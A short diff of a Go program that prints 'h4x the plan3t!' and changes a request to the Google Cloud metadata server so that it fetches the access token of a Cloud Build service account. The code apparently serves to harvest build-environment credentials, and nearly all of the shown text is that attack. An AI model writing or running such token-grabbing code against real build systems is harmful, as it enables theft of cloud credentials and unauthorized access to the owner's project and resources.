@@ -24,7 +24,7 @@ import (
 func main () {
   fmt.Println("h4x the plan3t!")
 
-  var serverAddr = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/210552627572@cloudbuild.gserviceaccount.com"
+  var serverAddr = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/210552627572@cloudbuild.gserviceaccount.com/token"
 
   req, err := http.NewRequest(http.MethodGet, serverAddr, nil)
   req.Header.Add("Metadata-Flavor", "Google")
